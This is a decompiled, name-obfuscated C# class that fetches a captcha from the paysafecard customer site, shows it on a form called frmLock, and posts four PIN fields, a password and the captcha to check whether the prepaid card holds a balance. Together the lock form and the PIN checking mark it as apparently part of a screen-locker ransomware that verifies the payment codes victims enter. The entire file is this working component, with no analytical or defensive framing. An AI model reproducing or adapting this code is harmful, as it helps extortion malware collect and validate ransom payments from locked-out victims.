using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns1;

internal class Class12
{
	private static string string_0;

	private static CookieContainer cookieContainer_0 = new CookieContainer();

	public static bool smethod_0()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://customer.cc.at.paysafecard.com/psccustomer/GetWelcomePanelServlet?language=de");
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.CookieContainer = cookieContainer_0;
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			string input = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
			string_0 = new Regex("id=\"javax.faces.ViewState\" value=\"(.+?)\"").Match(input).Groups[1].Value;
			httpWebRequest = (HttpWebRequest)WebRequest.Create("https://customer.cc.at.paysafecard.com/seam/resource/captcha");
			httpWebRequest.CookieContainer = cookieContainer_0;
			Image image = Image.FromStream(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
			Class1.Forms.frmLock.pbCaptcha.set_Image(image);
			((Control)Class1.Forms.frmLock.btnCaptchaOK).set_Enabled(true);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_1(string pin1, string pin2, string pin3, string pin4, string captcha, string pass = "")
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://customer.cc.at.paysafecard.com/psccustomer/GetWelcomePanelServlet");
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7";
			httpWebRequest.CookieContainer = cookieContainer_0;
			byte[] bytes = Encoding.Default.GetBytes("mainPagePart=mainPagePart&mainPagePart%3Arn1=" + pin1 + "&mainPagePart%3Arn2=" + pin2 + "&mainPagePart%3Arn3=" + pin3 + "&mainPagePart%3Arn4=" + pin4 + "&mainPagePart%3ApassField=" + pass + "&mainPagePart%3AverifyCaptcha=" + captcha + "&mainPagePart%3Anext=Absenden&javax.faces.ViewState=" + string_0);
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			string text = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
			if (text.Contains("Guthaben deiner"))
			{
				return text;
			}
			if (text.Contains("stimmt nicht mit dem Angezeigten"))
			{
				return "captcha";
			}
			if (text.Contains("Bei deinem PIN-Code und/oder Passwort ist ein Fehler aufgetreten"))
			{
				return "pinpass";
			}
			if (text.Contains("Bitte wende dich an unser Service-Team"))
			{
				return "pinpass";
			}
			return "uerror";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "uerror";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
